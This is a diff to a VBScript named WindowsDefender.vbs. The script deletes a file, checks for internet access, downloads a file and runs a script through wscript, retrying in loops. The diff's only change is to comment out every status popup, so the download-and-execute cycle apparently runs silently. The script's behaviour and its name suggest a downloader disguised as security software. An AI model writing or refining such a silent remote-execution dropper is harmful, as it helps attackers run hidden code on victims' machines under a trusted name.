@@ -20,10 +20,10 @@ Start()
 
 sub Start()
 	If objFSO.FileExists(toRun) Then
-        WshShell.Popup "File Exists (from WindowsDefender.vbs)", 2, "Start()", 64
+        'WshShell.Popup "File Exists (from WindowsDefender.vbs)", 2, "Start()", 64
 		objFSO.DeleteFile toRun, True '[force deletion]
 	Else
-        WshShell.Popup "File Doesn't Exists (from WindowsDefender.vbs)", 2, "Start()", 64
+        'WshShell.Popup "File Doesn't Exists (from WindowsDefender.vbs)", 2, "Start()", 64
 	End If
 	CheckInternetConnection
 End sub
@@ -35,12 +35,12 @@ sub CheckInternetConnection()
     objHTTP.send ""
     On Error GoTo 0
     If objHTTP.status = 200 Then
-        WshShell.Popup "Internet is connected! (from WindowsDefender.vbs)", 2, "CheckInternetConnection()", 64
+        'WshShell.Popup "Internet is connected! (from WindowsDefender.vbs)", 2, "CheckInternetConnection()", 64
         Set objHTTP = Nothing
 		DownloadFile
 		RunScript
     Else
-        WshShell.Popup "Internet is not connected! (from WindowsDefender.vbs), retrying in 10 seconds..", 2, "CheckInternetConnection()", 64
+        'WshShell.Popup "Internet is not connected! (from WindowsDefender.vbs), retrying in 10 seconds..", 2, "CheckInternetConnection()", 64
 		WScript.Sleep 10000 ' 10 seconds
         Set objHTTP = Nothing
 		CheckInternetConnection
@@ -62,7 +62,7 @@ sub DownloadFile()
 
     ' Handle errors during the request
     If Err.Number <> 0 Then
-        WshShell.Popup "Error during download request: " & Err.Description & "(from WindowsDefender.vbs), Retrying in 10 seconds ..", 2, "DownloadFile()", 64
+        'WshShell.Popup "Error during download request: " & Err.Description & "(from WindowsDefender.vbs), Retrying in 10 seconds ..", 2, "DownloadFile()", 64
         WScript.Sleep 10000 ' 10 seconds
         ' Clean up
         
@@ -89,7 +89,7 @@ sub DownloadFile()
     ' Handle errors during the file save
     If Err.Number <> 0 Then
         
-        WshShell.Popup "Error saving the file: " & Err.Description & "(from WindowsDefender.vbs), Retrying in 10 seconds ..", 2, "DownloadFile()", 64
+        'WshShell.Popup "Error saving the file: " & Err.Description & "(from WindowsDefender.vbs), Retrying in 10 seconds ..", 2, "DownloadFile()", 64
         
         WScript.Sleep 10000 ' 10 seconds
         ' Clean up
@@ -101,7 +101,7 @@ sub DownloadFile()
         DownloadFile
 		Exit Sub
     Else
-        WshShell.Popup "Downloaded " & downloadedFilename & " successfully. (from WindowsDefender.vbs)", 2, "DownloadFile()", 64
+        'WshShell.Popup "Downloaded " & downloadedFilename & " successfully. (from WindowsDefender.vbs)", 2, "DownloadFile()", 64
     End If
 
     On Error GoTo 0 ' Disable error handling
@@ -115,7 +115,7 @@ sub RunScript()
 	If objFSO.FileExists(scriptPath) Then
         CreateObject("WScript.Shell").Run "wscript """ & scriptPath & """", 1, True
     Else
-        WshShell.Popup "Script file not found at path: " & scriptPath & "(from WindowsDefender.vbs), Retrying everything in 10 seconds ..", 2, "RunScript()", 64
+        'WshShell.Popup "Script file not found at path: " & scriptPath & "(from WindowsDefender.vbs), Retrying everything in 10 seconds ..", 2, "RunScript()", 64
         WScript.Sleep 10000 ' 10 seconds
         Start
     End If
